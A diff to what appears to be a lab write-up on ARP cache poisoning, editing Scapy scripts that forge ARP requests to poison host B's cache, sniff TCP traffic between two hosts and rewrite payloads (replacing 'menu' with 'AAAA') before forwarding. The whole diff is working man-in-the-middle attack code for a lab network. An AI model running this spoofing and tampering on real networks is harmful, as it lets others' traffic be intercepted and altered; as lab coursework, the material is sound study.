@@ -207,10 +207,10 @@ A_MAC = "02:42:0a:09:00:05"
 B_MAC = "02:42:0a:09:00:06"
 M_MAC = "02:42:0a:09:00:69"
 
-# Ethernet layer. Sending a packet from M to A.
+# Ethernet layer. Sending a packet from M to B.
 E = Ether(src=M_MAC, dst= B_MAC)
 
-# ARP layer. Sending a packet from M to A with B IP AND M MAC.
+# ARP layer. Sending a packet from M to B with A IP AND M MAC.
 A = ARP(hwsrc=M_MAC, psrc=A_IP, hwdst=B_MAC, pdst=B_IP, op=1)
 
 pkt = E/A
@@ -322,7 +322,7 @@ def spoof_pkt(pkt):
         send(newpkt)
 
 # captures only packets that are not sent by the attacker.
-f = f"ip host {A_IP} or ip host {B_IP}"
+f = f"ip host {A_IP} or ip host {B_IP} and not ip host {M_IP} and not ether src {M_MAC}"
 pkt = sniff(iface="eth0", filter=f, prn=spoof_pkt)
 ```
 
@@ -373,32 +373,29 @@ A_MAC = "02:42:0a:09:00:05"
 B_MAC = "02:42:0a:09:00:06"
 M_MAC = "02:42:0a:09:00:69"
 
+
 def spoof_pkt(pkt):
-    # listen for packets. If a packet is going from A to B, then spoof.
-    if pkt[IP].src == A_IP and pkt[IP].dst == B_IP and pkt[Ether].src != M_MAC:
-        # create a new packet but remove checksums and TCP payload.
+    if pkt[IP].src == A_IP and pkt[IP].dst == B_IP and pkt[TCP].payload:
+        data = pkt[TCP].payload.load
         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
         del(newpkt[TCP].payload)
         del(newpkt[TCP].chksum)
-        
-        if pkt[TCP].payload:
-            data = pkt[TCP].payload.load
-            # replace every character with a Z.
-            newdata = data.replace(b"telnet", b"ZZZZZZ")
-            send(newpkt/newdata)
-        else:
+        print("Data: ", data)
+        if b'menu' in data:
+            newdata = data.replace(b'menu', b'AAAA')
+            newpkt = newpkt/newdata
             send(newpkt)
-    # if a packet is going from B to A, then send it to A.
-    elif pkt[IP].src == B_IP and pkt[IP].dst == A_IP and pkt[Ether].src == M_MAC:
-        
+        else:
+            send(newpkt/data)
+    elif pkt[IP].src == B_IP and pkt[IP].dst == A_IP:
         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
-        del(newpkt[TCP].payload)
+        del(newpkt[TCP].chksum)
         send(newpkt)
 
 # captures only packets that are not sent by the attacker.
-f = f"ip host {A_IP} or ip host {B_IP}"
+f = f"ip host {A_IP} or ip host {B_IP} and not ip host {M_IP} and not ether src {M_MAC} and not arp and not icmp and tcp"
 pkt = sniff(iface="eth0", filter=f, prn=spoof_pkt)
 ```
 
